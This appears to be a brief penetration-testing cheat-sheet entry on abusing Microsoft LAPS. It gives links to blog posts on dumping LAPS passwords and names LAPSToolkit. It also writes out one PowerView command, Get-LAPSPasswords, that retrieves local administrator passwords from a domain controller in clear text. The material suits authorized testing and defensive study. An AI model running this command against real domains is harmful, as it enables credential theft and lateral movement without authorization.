https://akijosberryblog.wordpress.com/2019/01/01/malicious-use-of-microsoft-laps/

https://akijosberryblog.wordpress.com/2017/11/09/dump-laps-password-in-clear-text/

LAPSToolkit

Using PowerView to Retrieve LAPS Passwords

```
Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
```
**!